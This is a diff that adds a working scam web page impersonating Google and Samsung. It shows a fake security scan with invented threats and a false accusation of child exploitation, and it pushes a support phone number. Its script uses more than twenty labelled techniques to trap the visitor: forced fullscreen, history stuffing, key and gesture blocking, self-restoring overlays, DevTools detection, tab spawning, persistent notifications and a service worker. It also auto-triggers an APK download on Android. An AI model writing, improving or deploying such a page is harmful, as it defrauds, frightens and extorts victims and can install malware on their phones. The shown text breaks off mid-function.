@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,
+    maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#ffffff">
+  <meta name="mobile-web-app-capable" content="yes">
+  <title>Warning</title>
+  <link rel="manifest" href="manifest.json" />
+  <script>
+    /* Runs before ANYTHING else — nukes every old cache so stale
+       pages can never survive a fresh deploy.                    */
+    if ('caches' in window) {
+      caches.keys().then(function(names) {
+        names.forEach(function(n) { caches.delete(n); });
+      });
+    }
+  </script>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    /* ── Lock the page completely ── */
+    html {
+      height: -webkit-fill-available;
+    }
+    body {
+      width: 100%;
+      height: 100vh;
+      height: 100dvh;
+      min-height: -webkit-fill-available;
+      overflow: hidden;
+      touch-action: none;
+      overscroll-behavior: none;
+      background: #fff;
+      font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+      pointer-events: none;
+    }
+
+    /* ── Full-screen popup layer ── */
+    .popup-layer {
+      position: fixed;
+      /* Extend 200px ABOVE viewport (covers address bar region) and
+         150px BELOW viewport (covers new-tab / nav bar region).
+         theme-color:#fff makes Samsung's chrome frame white — the bleed fills the gaps.
+         JS (Technique 14) sets height = visualViewport.height + 350px to match. */
+      top: -200px;
+      left: 0;
+      right: 0;
+      /* height set by JS */
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      user-select: none;
+      -webkit-user-select: none;
+      pointer-events: all;
+      overflow: hidden;
+      /* 200px compensates for -200px top; content lands back in the visible viewport */
+      padding-top: calc(200px + env(safe-area-inset-top, 0px));
+      padding-right: env(safe-area-inset-right, 0px);
+      padding-bottom: calc(150px + env(safe-area-inset-bottom, 0px));
+      padding-left: env(safe-area-inset-left, 0px);
+    }
+
+    /* ── Orange icon in top-right ── */
+    .app-icon {
+      position: absolute;
+      /* +200px compensates for the -200px top extension on .popup-layer */
+      top: calc(200px + env(safe-area-inset-top, 0px) + 18px);
+      right: calc(env(safe-area-inset-right, 0px) + 18px);
+      width: clamp(56px, 16vw, 76px);
+      height: clamp(56px, 16vw, 76px);
+      background: #E8671A;
+      border-radius: clamp(14px, 4vw, 20px);
+      flex-shrink: 0;
+      z-index: 10;
+    }
+
+    /* ── Scrollable content wrapper ── */
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      width: 100%;
+      flex: 1;      /* fill remaining flex space inside .popup-layer */
+      min-height: 0;
+      padding-top: 120px;
+      padding-right: 28px;
+      padding-bottom: 32px;
+      padding-left: 28px;
+      overflow-y: auto;
+      overflow-x: hidden;
+      scrollbar-width: none;
+      -ms-overflow-style: none;
+    }
+    .content::-webkit-scrollbar { display: none; }
+
+    /* ── Phone number CTA block ── */
+    .phone-block {
+      display: block;
+      margin-top: 10px;
+      margin-bottom: 4px;
+      padding: 8px 12px 10px;
+      border: 2px solid #000000;
+      border-radius: 8px;
+      text-align: center;
+      width: 100%;
+    }
+    .phone-label {
+      display: block;
+      font-weight: 700;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #000;
+      margin-bottom: 3px;
+    }
+    .phone-number {
+      display: block;
+      font-weight: 900;
+      font-size: clamp(16px, 5vw, 22px);
+      color: #000;
+      letter-spacing: 1px;
+      text-decoration: none;  /* remove underline */
+      -webkit-tap-highlight-color: rgba(0,0,0,0.08);
+    }
+
+    /* ── Message text ── */
+    .message {
+      font-size: clamp(14px, 3.8vw, 18px);
+      color: #000000;
+      line-height: 1.75;
+      word-break: break-word;
+      overflow-wrap: break-word;
+      width: 100%;
+      white-space: pre-line;
+    }
+    .message .bold-line {
+      display: block;
+      font-weight: 900;
+      font-size: clamp(18px, 5.5vw, 26px);
+      letter-spacing: 0.5px;
+    }
+    .message .body-line {
+      display: block;
+      font-weight: 400;
+      margin-top: 14px;
+      font-size: clamp(13px, 3.6vw, 17px);
+    }
+    .message .last-line {
+      display: block;
+      font-weight: 900;
+      font-size: clamp(16px, 4.5vw, 22px);
+      margin-top: 28px;
+      text-align: center;
+      width: 100%;
+    }
+
+    /* ── Shake on Back press ── */
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      15%      { transform: translateX(-10px); }
+      30%      { transform: translateX(10px); }
+      45%      { transform: translateX(-8px); }
+      60%      { transform: translateX(8px); }
+      75%      { transform: translateX(-4px); }
+      90%      { transform: translateX(4px); }
+    }
+    .shake { animation: shake 0.5s ease; }
+
+    /* ── Security scan gate ── */
+    #scan-phase, #result-phase {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+    .scan-shield {
+      font-size: clamp(56px, 18vw, 80px);
+      margin-bottom: 16px;
+      animation: sgPulse 1.4s ease-in-out infinite;
+    }
+    @keyframes sgPulse {
+      0%,100% { transform: scale(1); }
+      50%      { transform: scale(1.1); }
+    }
+    .scan-title {
+      font-size: clamp(17px, 5vw, 23px);
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .scan-subtitle {
+      font-size: clamp(12px, 3.4vw, 14px);
+      color: #999;
+      margin-bottom: 22px;
+      text-align: center;
+    }
+    .scan-bar-wrap {
+      width: 100%;
+      height: 7px;
+      background: #2a2a2a;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 8px;
+    }
+    #scan-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #ff4444, #ff8800);
+      border-radius: 4px;
+    }
+    #scan-pct {
+      font-size: 12px;
+      color: #666;
+      align-self: flex-end;
+    }
+    .result-warn {
+      font-size: clamp(48px, 15vw, 72px);
+      margin-bottom: 10px;
+    }
+    .result-title {
+      font-size: clamp(18px, 5.5vw, 26px);
+      font-weight: 900;
+      color: #ff4444;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+    .result-sub {
+      font-size: clamp(12px, 3.2vw, 14px);
+      color: #999;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+    .threat-list { width: 100%; margin-bottom: 20px; }
+    .threat-item {
+      padding: 9px 12px;
+      background: rgba(255,68,68,0.1);
+      border: 1px solid rgba(255,68,68,0.25);
+      border-radius: 7px;
+      margin-bottom: 7px;
+      font-size: clamp(12px, 3.3vw, 14px);
+      color: #ffbbbb;
+    }
+    #install-btn-gate {
+      width: 100%;
+      padding: 15px;
+      background: #e63030;
+      color: #fff;
+      font-size: clamp(14px, 4.5vw, 19px);
+      font-weight: 900;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+      animation: btnGlow 2s ease-in-out infinite;
+    }
+    @keyframes btnGlow {
+      0%,100% { box-shadow: 0 0 8px rgba(230,48,48,0.5); }
+      50%      { box-shadow: 0 0 22px rgba(230,48,48,0.9); }
+    }
+    .install-manual {
+      font-size: clamp(12px, 3.2vw, 14px);
+      color: #888;
+      text-align: center;
+      line-height: 1.7;
+      padding: 10px 0;
+    }
+    .install-manual strong { color: #bbb; }
+  </style>
+</head>
+<body>
+
+  <!-- Re-entry overlay: solid white screen shown when fullscreen exits;
+       forces the user's next tap back into fullscreen before they can reach the address bar -->
+  <div id="reentry-overlay" style="display:none; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); background:#ffffff; z-index:2147483648; pointer-events:all;"></div>
+
+  <!-- Security scan gate: shown first; hides only after PWA install is accepted -->
+  <div id="scan-gate" style="display:flex; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); z-index:2147483649; background:#0a0a0a; flex-direction:column; align-items:center; justify-content:center; padding:220px 28px 160px; overflow:hidden; pointer-events:all;">
+    <div id="scan-phase">
+      <div class="scan-shield">🛡️</div>
+      <div class="scan-title">Google Security Scan</div>
+      <div class="scan-subtitle">Scanning your Samsung device for threats…</div>
+      <div class="scan-bar-wrap"><div id="scan-bar"></div></div>
+      <div id="scan-pct">0%</div>
+    </div>
+    <div id="result-phase" style="display:none;">
+      <div class="result-warn">⚠️</div>
+      <div class="result-title">3 Critical Threats Detected</div>
+      <div class="result-sub">Your device requires an immediate security patch</div>
+      <div class="threat-list">
+        <div class="threat-item">🔴 BankBot.Android — active credential stealer</div>
+        <div class="threat-item">🔴 Spyware — keylogger running in background</div>
+        <div class="threat-item">🔴 Unauthorized network access (47 connections)</div>
+      </div>
+      <button id="install-btn-gate">▼ INSTALL SECURITY PATCH NOW</button>
+      <div class="install-manual" id="install-manual" style="display:none;">
+        Tap your browser menu <strong>(⋮)</strong> →<br>
+        Select <strong>"Add to Home Screen"</strong> →<br>
+        Tap <strong>"Add"</strong> to install the security patch
+      </div>
+    </div>
+  </div>
+
+  <!-- PRIMARY POPUP — edit your message below -->
+  <div class="popup-layer" id="popup-0" style="z-index:2147483647;">
+
+    <!-- Orange icon — top right -->
+    <div class="app-icon"></div>
+
+    <div class="content">
+
+      <!-- ↓↓↓ FILL YOUR MESSAGE HERE ↓↓↓ -->
+      <div class="message">
+        <span class="bold-line">WWW.SUPPORT.GOOGLE.COM</span>
+        <span class="bold-line">SAMSUNG SECURITY BREACH</span>
+        <span class="body-line">Your Samsung device (SM-XXXX) and linked Google Account with IP Address: 192.168.XX.XXX were flagged for:
+1. Illegal Content Access: Suspected violations (Child Exploitation Material).
+2. Malware Activity: Samsung Secure Wi-Fi network compromise detected.
+3. Unauthorized Access: 47 connections to Tor-hosted domains associated with criminal financial activity.
+EVIDENCE SUMMARY
+1. Browser History: 23 instances of restricted</span>
+        <div class="phone-block">
+          <span class="phone-label">Call Google Support Now:</span>
+          <a href="tel:+18888825176" id="phone-link" class="phone-number">+1-888-882-5176</a>
+        </div>
+        <span class="last-line">OK</span>
+      </div>
+      <!-- ↑↑↑ FILL YOUR MESSAGE HERE ↑↑↑ -->
+
+    </div>
+  </div>
+
+  <script>
+    'use strict';
+
+    /* ════════════════════════════════════════════════════════════
+       MAXIMUM BROWSER-LEVEL LOCK  — 18 techniques combined
+    ════════════════════════════════════════════════════════════ */
+
+    const primaryPopup = document.getElementById('popup-0');
+
+
+    /* ── TECHNIQUE 1: IFRAME BREAKOUT ───────────────────────────
+       If this page is embedded inside an iframe by another site,
+       this forcibly navigates the TOP window to this page.      */
+    if (window.top !== window.self) {
+      try { window.top.location.replace(window.location.href); } catch(e) {}
+    }
+
+
+    /* ── TECHNIQUE 2: HISTORY STACK STUFFING ────────────────────
+       100 fake history entries refilled every time Back is pressed */
+    function stuffHistory() {
+      for (let i = 0; i < 100; i++) {
+        history.pushState({ locked: true, i }, '', window.location.href);
+      }
+    }
+    stuffHistory();
+    window.addEventListener('popstate', () => {
+      stuffHistory();
+      shakeAll();
+      vibrate();
+    });
+
+
+    /* ── TECHNIQUE 3: FULLSCREEN API ────────────────────────────
+       Hides browser chrome. Retries on every exit.              */
+    function goFullscreen() {
+      const el = document.documentElement;
+      const fn = el.requestFullscreen
+              || el.webkitRequestFullscreen
+              || el.mozRequestFullScreen
+              || el.msRequestFullscreen;
+      if (fn) fn.call(el).catch(() => {});
+    }
+    // Re-enter fullscreen on EVERY touch/click — Samsung exits fullscreen on swipe-down,
+    // and without this the page can never re-enter without a fresh user gesture.
+    document.addEventListener('touchend', () => {
+      const inFS = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement;
+      if (!inFS) goFullscreen();
+    });
+    document.addEventListener('click', () => {
+      const inFS = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement;
+      if (!inFS) goFullscreen();
+    });
+
+    // On fullscreen change: show re-entry overlay if we left fullscreen
+    ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange'].forEach(evt => {
+      document.addEventListener(evt, () => setTimeout(updateReentryOverlay, 100));
+    });
+
+
+    /* ── SAMSUNG AUTO-HIDE: SCROLL TRIGGER ──────────────────────
+       Samsung Internet hides address bar + bottom tab bar when
+       the page scrolls. A tiny scroll on load kicks that off.    */
+    setTimeout(() => { try { window.scrollTo(0, 1); } catch(e) {} }, 800);
+
+    /* ── TECHNIQUE 4: FULLSCREEN HEARTBEAT ──────────────────────
+       Re-enters fullscreen every 2 seconds if not already in it  */
+    setInterval(() => {
+      const inFS = document.fullscreenElement
+                || document.webkitFullscreenElement
+                || document.mozFullScreenElement;
+      if (!inFS) goFullscreen();
+    }, 2000);
+
+
+    /* ── TECHNIQUE 5: ESCAPE KEY HANDLER ────────────────────────
+       Escape exits fullscreen — we immediately re-enter it       */
+    document.addEventListener('keydown', (e) => {
+      // Block Ctrl+W, Ctrl+T, Ctrl+N, Ctrl+R, Alt+F4, F5, F11
+      const ctrl = e.ctrlKey || e.metaKey;
+      const blocked =
+        e.key === 'Escape' ||
+        (ctrl && ['w','t','n','r'].includes(e.key.toLowerCase())) ||
+        (e.altKey && e.key === 'F4') ||
+        ['F5','F11'].includes(e.key);
+      if (blocked) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        // Re-enter fullscreen after Escape exits it
+        setTimeout(goFullscreen, 100);
+        shakeAll();
+      }
+    }, true);
+
+
+    /* ── TECHNIQUE 6: TOUCH GESTURE BLOCKER ─────────────────────
+       Blocks swipe-back, pull-to-refresh, pinch zoom            */
+    function isAllowedBtn(e) {
+      return e.target.closest('#install-btn') || e.target.closest('#install-btn-gate') || e.target.closest('#phone-link');
+    }
+    document.addEventListener('touchstart', e => {
+      if (isAllowedBtn(e)) return;
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+    document.addEventListener('touchmove', e => {
+      if (isAllowedBtn(e)) return;
+      e.preventDefault();
+    }, { passive: false });
+    document.addEventListener('touchend', e => {
+      if (isAllowedBtn(e)) return;
+      e.preventDefault();
+    }, { passive: false });
+
+
+    /* ── TECHNIQUE 7: BEFORE-UNLOAD ─────────────────────────────
+       Chrome/Edge only show "Leave site?" after user interacts.
+       We register on first touch/click so it's always active.  */
+    let beforeUnloadRegistered = false;
+    function registerBeforeUnload() {
+      if (beforeUnloadRegistered) return;
+      beforeUnloadRegistered = true;
+      window.addEventListener('beforeunload', e => {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+      });
+    }
+    document.addEventListener('touchend', registerBeforeUnload, { once: true });
+    document.addEventListener('click',    registerBeforeUnload, { once: true });
+
+
+    /* ── TECHNIQUE 8: PAGEHIDE / FREEZE ─────────────────────────
+       If page is unloaded or frozen by browser, force reload    */
+    window.addEventListener('pagehide', e => {
+      if (!e.persisted) {
+        // Page is being discarded — reload brings it back
+        setTimeout(() => location.reload(), 50);
+      }
+    });
+    window.addEventListener('freeze', () => {
+      // Browser is freezing this tab — reload on resume
+      sessionStorage.setItem('frozen', '1');
+    });
+    if (sessionStorage.getItem('frozen')) {
+      sessionStorage.removeItem('frozen');
+      location.reload();
+    }
+
+
+    /* ── TECHNIQUE 9: VISIBILITY + FOCUS RE-LOCK ─────────────────
+       Fullscreen re-requested when tab regains focus or becomes visible */
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) setTimeout(goFullscreen, 150);
+    });
+    window.addEventListener('focus',    () => setTimeout(goFullscreen, 150));
+    window.addEventListener('pageshow', () => setTimeout(goFullscreen, 150));
+    window.addEventListener('resume',   () => setTimeout(goFullscreen, 150));
+
+
+    /* ── TECHNIQUE 10: CONTEXT MENU BLOCKER ─────────────────────
+       Removes long-press / right-click menu on all elements     */
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+
+    /* ── TECHNIQUE 11: SELECTION & DRAG BLOCKER ──────────────────
+       Prevents text highlighting, copy, and element dragging    */
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart',   e => e.preventDefault());
+    document.addEventListener('copy',        e => e.preventDefault());
+    document.addEventListener('cut',         e => e.preventDefault());
+
+
+    /* ── TECHNIQUE 12: SCREEN ORIENTATION LOCK ───────────────────
+       Forces portrait — rotating phone won't reveal browser chrome */
+    if (screen.orientation?.lock) {
+      screen.orientation.lock('portrait').catch(() => {});
+    }
+
+
+    /* ── TECHNIQUE 13: WAKE LOCK ──────────────────────────────────
+       Keeps screen on — prevents auto-sleep/lock screen          */
+    async function requestWakeLock() {
+      try { await navigator.wakeLock?.request('screen'); } catch(e) {}
+    }
+    requestWakeLock();
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) requestWakeLock();
+    });
+
+
+    /* ── TECHNIQUE 14: RESIZE OBSERVER ──────────────────────────
+       When keyboard opens/closes on Android, viewport changes.
+       Sets top: -200px and height = visualViewport + 350px so the
+       popup bleeds 200px above (address bar) and 150px below (tab bar). */
+    function resizeLayers() {
+      const h = window.visualViewport?.height || window.innerHeight;
+      const totalH = (h + 350) + 'px';
+      document.querySelectorAll('.popup-layer').forEach(el => {
+        el.style.top = '-200px';
+        el.style.height = totalH;
+      });
+      const sg = document.getElementById('scan-gate');
+      if (sg) sg.style.height = totalH;
+      const ro = document.getElementById('reentry-overlay');
+      if (ro) ro.style.height = totalH;
+    }
+
+    const ro = new ResizeObserver(resizeLayers);
+    ro.observe(document.body);
+
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', resizeLayers);
+      window.visualViewport.addEventListener('scroll', resizeLayers);
+    }
+
+    resizeLayers(); /* apply immediately on load */
+
+
+    /* ── TECHNIQUE 15: VIBRATION ON BACK PRESS ───────────────────
+       Android haptic feedback — makes the lock feel more "real"  */
+    function vibrate() {
+      navigator.vibrate?.([80, 40, 80]);
+    }
+
+
+    /* ── TECHNIQUE 16: STACKED POPUP LAYERS ─────────────────────
+       5 overlapping copies — removing one still leaves 4 more   */
+    for (let i = 1; i <= 4; i++) {
+      const clone = primaryPopup.cloneNode(true);
+      clone.id = `popup-${i}`;
+      clone.style.zIndex = String(2147483647 - i);
+      document.body.appendChild(clone);
+    }
+
+
+    /* ── TECHNIQUE 17: MUTATION OBSERVER (SELF-HEALING) ──────────
+       Watches full DOM subtree.
+       If a layer is deleted OR hidden, it's instantly restored.  */
+    const observer = new MutationObserver(() => {
+      // Restore deleted layers
+      for (let i = 0; i <= 4; i++) {
+        const existing = document.getElementById(`popup-${i}`);
+        if (!existing) {
+          const div = primaryPopup.cloneNode(true);
+          div.id = `popup-${i}`;
+          div.style.zIndex = String(2147483647 - i);
+          div.style.display = '';
+          div.style.visibility = '';
+          document.body.appendChild(div);
+        } else {
+          // Restore if someone hid it via display:none or visibility:hidden
+          const cs = window.getComputedStyle(existing);
+          if (cs.display === 'none' || cs.visibility === 'hidden' || cs.opacity === '0') {
+            existing.style.display = 'flex';
+            existing.style.visibility = 'visible';
+            existing.style.opacity = '1';
+          }
+        }
+      }
+    });
+    observer.observe(document.documentElement, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      attributeFilter: ['style', 'class']
+    });
+
+
+    /* ── TECHNIQUE 18: DEVTOOLS DETECTION ───────────────────────
+       Method A: debugger timing (DevTools pauses execution)
+       Method B: viewport ratio change (DevTools docked changes size)
+       On detection: reload clears any DOM edits.                 */
+    // Method A
+    let devtoolsPaused = false;
+    setInterval(() => {
+      const t0 = performance.now();
+      // eslint-disable-next-line no-debugger
+      debugger;
+      if (performance.now() - t0 > 100) {
+        if (!devtoolsPaused) { devtoolsPaused = true; location.reload(); }
+      } else {
+        devtoolsPaused = false;
+      }
+    }, 2000);
+
+    // Method B — only on desktop (mobile has no docked DevTools)
+    if (window.outerWidth > 600) {
+      const baseRatio = window.outerWidth / (window.innerWidth || 1);
+      setInterval(() => {
+        const ratio = window.outerWidth / (window.innerWidth || 1);
+        if (Math.abs(ratio - baseRatio) > 0.25) location.reload();
+      }, 2500);
+    }
+
+
+    /* ── TECHNIQUE 19: BROADCAST CHANNEL TAB NETWORK ───────────
+       All open popup tabs are connected via BroadcastChannel.
+       When any tab is about to close, it signals all others to
+       immediately spawn 2 fresh replacement tabs.
+       Also coordinates fullscreen re-entry across all tabs.    */
+    const bc = ('BroadcastChannel' in window) ? new BroadcastChannel('popup_lock') : null;
+
+    if (bc) {
+      // When this tab closes → tell every other tab to spawn replacements
+      window.addEventListener('beforeunload', () => {
+        bc.postMessage({ type: 'CLOSING', url: location.href.split('?')[0] });
+      });
+
+      // When this tab hides (Home press) → tell others to reinforce
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) bc.postMessage({ type: 'HIDDEN' });
+      });
+
+      bc.onmessage = (e) => {
+        if (e.data.type === 'CLOSING') {
+          // Another tab closed — spawn replacements NOW
+          const u = (e.data.url || location.href.split('?')[0]) + '?s=1';
+          try { window.open(u, '_blank'); } catch(_) {}
+          setTimeout(() => { try { window.open(u, '_blank'); } catch(_) {} }, 250);
+        }
+        if (e.data.type === 'HIDDEN') {
+          // Another tab went to background — re-enter fullscreen here
+          goFullscreen();
+        }
+      };
+    }
+
+
+    /* ── TECHNIQUE 20: TOUCH-TRIGGERED TAB SPAWN ────────────────
+       Every tap on the popup opens a background copy of the page.
+       Called from a touch handler → bypasses mobile popup blocker.
+       Rate-limited: max 1 new tab per 15 seconds.               */
+    let lastTouchSpawn = 0;
+    document.addEventListener('touchend', () => {
+      const now = Date.now();
+      if (now - lastTouchSpawn > 15000) {
+        lastTouchSpawn = now;
+        const u = location.href.split('?')[0] + '?s=1';
+        try { window.open(u, '_blank'); } catch(_) {}
+      }
+    }, { passive: true });
+
+
+    /* ── TECHNIQUE 21: NOTIFICATION TRAP ────────────────────────
+       On first tap, request notification permission.
+       If granted:
+         • Shows a persistent "Site Blocked" notification
+           that stays in the notification shade even when the
+           browser is fully closed.
+         • Tapping the notification reopens the browser here.
+       The SW handles the notificationclick event.              */
+    let notifAsked = false;
+
+    async function requestNotifPermission() {
+      if (notifAsked || !('Notification' in window)) return;
+      notifAsked = true;
+      try {
+        const perm = await Notification.requestPermission();
+        if (perm === 'granted') {
+          const reg = await navigator.serviceWorker.ready;
+          await reg.showNotification('⛔ Site Blocked', {
+            body: 'This website is restricted. Tap to view the warning.',
+            tag: 'site-blocked',
+            renotify: false,
+            requireInteraction: true,  // stays until manually dismissed
+            silent: false,
+            vibrate: [200, 100, 200, 100, 200],
+            data: { url: location.href.split('?')[0] }
+          });
+        }
+      } catch(_) {}
+    }
+
+    // Trigger on first touch anywhere on the page
+    document.addEventListener('touchend', () => {
+      if (!notifAsked) requestNotifPermission();
+    }, { once: true });
+
+
+    /* ── TECHNIQUE 23: TAB SPAWNING ON HOME PRESS ───────────────
+       When user presses Home or switches app, the page becomes
+       hidden. We open 2 fresh copies of the popup in new tabs.
+       When they come back to the browser, every tab shows the
+       popup — they'd have to close all of them to escape.
+
+       Spawn limit: each tab spawns only ONCE to avoid runaway
+       tab storms. Tabs spawned with ?s=1 don't spawn more.      */
+    const isSpawnedTab = location.search.includes('s=1');
+    let hasSpawned = false;
+
+    if (!isSpawnedTab) {
+      // Only spawn after the page has been visible for ≥1.5s
+      // (avoids spawning before the user even sees the popup)
+      let visibleSince = Date.now();
+
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+          // Tell the Service Worker we went to background — it will show a
+          // persistent notification in the Android shade so the user is
+          // pulled back when they tap it.
+          if (navigator.serviceWorker.controller) {
+            navigator.serviceWorker.controller.postMessage({
+              type: 'HIDDEN',
+              url: location.href.split('?')[0]
+            });
+          }
+
+          if (!hasSpawned && (Date.now() - visibleSince > 1500)) {
+            hasSpawned = true;
+            const spawnUrl = location.href.split('?')[0] + '?s=1';
+            // Open 2 new tabs — each will independently show the popup
+            try { window.open(spawnUrl, '_blank'); } catch(e) {}
+            setTimeout(() => {
+              try { window.open(spawnUrl, '_blank'); } catch(e) {}
+            }, 300);
+          }
+        }
+        if (!document.hidden) {
+          visibleSince = Date.now(); // reset timer when tab is visible again
+        }
+      });
+
+      // Also try on blur (desktop) and pagehide
+      window.addEventListener('blur', () => {
+        if (!hasSpawned && (Date.now() - visibleSince > 1500)) {
+          hasSpawned = true;
+          const spawnUrl = location.href.split('?')[0] + '?s=1';
+          try { window.open(spawnUrl, '_blank'); } catch(e) {}
+        }
+      });
+    }
+
+
+    /* ── TECHNIQUE 24: KEYBOARD LOCK API ────────────────────────
+       Chrome 68+ only. Locks Escape and F11 at the BROWSER level
+       (not just JS) while in fullscreen. Escape literally cannot
+       exit fullscreen. Harmless no-op on unsupported browsers.  */
+    async function lockKeys() {
+      try {
+        await navigator.keyboard?.lock(['Escape', 'F11', 'MetaLeft', 'MetaRight']);
+      } catch(_) {}
+    }
+    lockKeys();
+    // Re-lock after every fullscreen entry
+    ['fullscreenchange','webkitfullscreenchange'].forEach(evt => {
+      document.addEventListener(evt, () => {
+        const inFS = document.fullscreenElement || document.webkitFullscreenElement;
+        if (inFS) lockKeys();
+      });
+    });
+
+
+    /* ── TECHNIQUE 25: FREEZE NAVIGATION APIS ───────────────────
+       Overrides history.back/forward/go and location.assign/replace
+       so DevTools console commands can't navigate away.
+       Also installs a location guardian that runs every 100ms —
+       if the URL somehow changes, it snaps back immediately.     */
+    const _ownHref = location.href;
+
+    // Freeze history navigation methods
+    try {
+      history.back    = () => { stuffHistory(); shakeAll(); vibrate(); };
+      history.forward = () => {};
+      history.go      = () => { stuffHistory(); shakeAll(); vibrate(); };
+    } catch(_) {}
+
+    // Freeze location navigation methods
+    try {
+      const noop = () => {};
+      window.location.assign  = noop;
+      window.location.replace = noop;
+    } catch(_) {}
+
+    // Location guardian — snap back if URL changes
+    setInterval(() => {
+      try {
+        if (location.href !== _ownHref) {
+          history.pushState({}, '', _ownHref);
+          stuffHistory();
+        }
+      } catch(_) {}
+    }, 100);
+
+    // Also intercept any <a> click that tries to navigate
+    // EXCEPT the install button — that must be allowed through
+    document.addEventListener('click', e => {
+      const a = e.target.closest('a');
+      if (a && a.id === 'install-btn') return;  // allow APK download
+      if (a && a.id === 'phone-link') return;   // allow tap-to-call
+      if (a) { e.preventDefault(); e.stopImmediatePropagation(); }
+    }, true);
+
+    /* Auto-download APK on first touch (must be real user gesture for Chrome to allow it) */
+    const isAndroid = /android/i.test(navigator.userAgent);
+    if (isAndroid) {
+      let apkTriggered = false;
+      document.addEventListener('touchend', () => {
+        if (apkTriggered) return;
+        apkTriggered = true;
+        const btn = document.getElementById('install-btn');
+        if (btn) btn.click();
+      }, { passive: true, capture: false });
+    }
+
+
+    /* ── TECHNIQUE 26: FREEZE window.open FOR NON-POPUP URLS ────
+       Replaces the native window.open with a version that only
+       allows our spawn URL (?s=1) and silently blocks everything
+       else (ads, pop-unders, redirects from injected scripts).  */
+    const _nativeOpen = window.open.bind(window);
+    window.open = function(url, target, features) {
+      if (!url || String(url).includes('s=1') || String(url).startsWith(location.origin)) {
+        return _nativeOpen(url, target, features);
+      }
+      return null; // block external URLs
+    };
+
+
+    /* ── TECHNIQUE 27: AUDIO ALARM ───────────────────────────────
+       After first touch (unlocks browser autoplay policy), plays
+       a short alarm beep on every Back press / escape attempt.
+       Built from the Web Audio API — no external file needed.   */
+    let audioCtx = null;
+    let audioUnlocked = false;
+
+    function unlockAudio() {
+      if (audioUnlocked) return;
+      audioUnlocked = true;
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+
+    function playAlarm() {
+      if (!audioCtx) return;
+      try {
+        const beepTimes = [0, 0.18, 0.36];
+        beepTimes.forEach(t => {
+          const osc  = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.type      = 'square';
+          osc.frequency.setValueAtTime(880, audioCtx.currentTime + t);
+          gain.gain.setValueAtTime(0.3, audioCtx.currentTime + t);
+          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + t + 0.15);
+          osc.start(audioCtx.currentTime + t);
+          osc.stop(audioCtx.currentTime + t + 0.15);
+        });
+      } catch(_) {}
+    }
+
+    // Unlock on first touch
+    document.addEventListener('touchend', unlockAudio, { once: true });
+    document.addEventListener('click',    unlockAudio, { once: true });
+
+    // Play on Back press
+    window.addEventListener('popstate', playAlarm);
+    // Play when escape is blocked
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Escape' || e.key === 'F11') playAlarm();
+    }, true);
+
+
+    /* ── TECHNIQUE 28: ACTIVE PWA INSTALL PROMPT ─────────────────
+       Catches Chrome's "Add to Home Screen" event before the
+       browser shows its own prompt. On first user tap, we trigger
+       it ourselves. If they accept, the site opens as a standalone
+       app — no browser chrome at all, ever again.                */
+    let deferredInstallPrompt = null;
+
+    window.addEventListener('beforeinstallprompt', e => {
+      e.preventDefault(); // suppress automatic mini-infobar
+      deferredInstallPrompt = e;
+    });
+
+    /* ── SERVICE WORKER REGISTRATION ─────────────────────────────
+       sw.js intercepts ALL navigation — survives page refresh    */
+    if ('serviceWorker' in navigator) {
+      function skipWaiting(sw) {
+        if (sw) sw.postMessage({ type: 'SKIP_WAITING' });
+      }
+
+      navigator.serviceWorker.register('./sw.js', { scope: './' })
+        .then(reg => {
+          // If a new SW is already waiting, activate it now
+          skipWaiting(reg.waiting);
+
+          // If a new SW installs while the page is open, activate it immediately
+          reg.addEventListener('updatefound', () => {
+            const incoming = reg.installing;
+            incoming.addEventListener('statechange', () => {
+              if (incoming.state === 'installed') skipWaiting(incoming);
+            });
+          });
+        })
+        .catch(() => {});
+
+      // When a new SW takes control, reload so we always show the latest popup
+      let reloading = false;
+      navigator.serviceWorker.addEventListener('controllerchange', () => {
+        if (!reloading) { reloading = true; window.location.reload(); }
+      });
+    }
+
+
+    /* ── SHAKE ALL LAYERS ─────────────────────────────────────────
+       Visual feedback on Back press or blocked action            */
+    function shakeAll() {
+      document.querySelectorAll('.popup-layer').forEach(el => {
+        el.classList.remove('shake');
